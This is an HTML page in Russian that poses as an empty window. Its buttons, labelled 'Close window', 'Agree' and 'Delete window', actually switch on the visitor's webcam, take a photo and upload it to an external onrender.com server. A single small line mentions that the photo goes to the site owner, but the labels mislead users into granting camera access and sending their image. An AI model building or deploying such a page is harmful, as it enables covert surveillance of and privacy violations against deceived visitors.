<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Camera</title>
  <style>
    :root { color-scheme: dark; }
    body{
      margin:0;
      background:#0b0f14;
      color:#e8eef6;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      text-align:center;
      padding:18px;
    }
    .card{max-width:520px;margin:0 auto}
    h2{margin:8px 0 8px}
    p{margin:6px 0; opacity:.85; line-height:1.35}
    
    button{
      margin:8px 6px;
      padding:12px 16px;
      border:0;
      border-radius:10px;
      background:#00c853;
      color:#0b0f14;
      font-weight:800;
      cursor:pointer;
    }
    button:disabled{opacity:.5; cursor:not-allowed}
    .status{margin-top:10px; opacity:.9}
    .small{font-size:12px; opacity:.65}
  </style>
</head>
<body>
  <div class="card">
    <h2>Закройте окно это пустой окно </h2>

    <!-- Важно: честно предупреждаем -->
    <p>Фото будет отправлено владельцу сайта.</p>

    
    <div>
      <button id="btnStart">Закрыть окно </button>
      <button id="btnShot" disabled>Согласен</button>
      <button id="btnSend" disabled>Удалить окно </button>
    </div>

    <div class="status" id="status">Нажми “Отменииь загрузку ”.</div>
    <div class="small">Если сервер “спит”, первая отправка может занять до 30–50 секунд.</div>
  </div>

<script>
const btnStart = document.getElementById("btnStart");
const btnShot  = document.getElementById("btnShot");
const btnSend  = document.getElementById("btnSend");
const statusEl = document.getElementById("status");

let stream = null;
let imageData = null;

// Запуск камеры
btnStart.onclick = async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.autoplay = true;
    video.srcObject = stream;
    document.body.prepend(video);

    statusEl.innerText = "Камера включена";
    btnShot.disabled = false;
  } catch (e) {
    statusEl.innerText = "Нет доступа к камере";
  }
};

// Сделать фото
btnShot.onclick = () => {
  if (!stream) return;

  const video = document.querySelector("video");

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  imageData = canvas.toDataURL("image/jpeg");

  statusEl.innerText = "Фото сделано";
  btnSend.disabled = false;
};

// Отправка
btnSend.onclick = async () => {
  if (!imageData) return;

  statusEl.innerText = "Отправка...";

  try {
    const res = await fetch("https://camera-server-ay1p.onrender.com/upload", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ image: imageData })
    });

    if (res.ok) {
      statusEl.innerText = "Отправлено ✔";
    } else {
      statusEl.innerText = "Ошибка сервера";
    }
  } catch {
    statusEl.innerText = "Ошибка сети";
  }
};
</script>
</body>
</html>
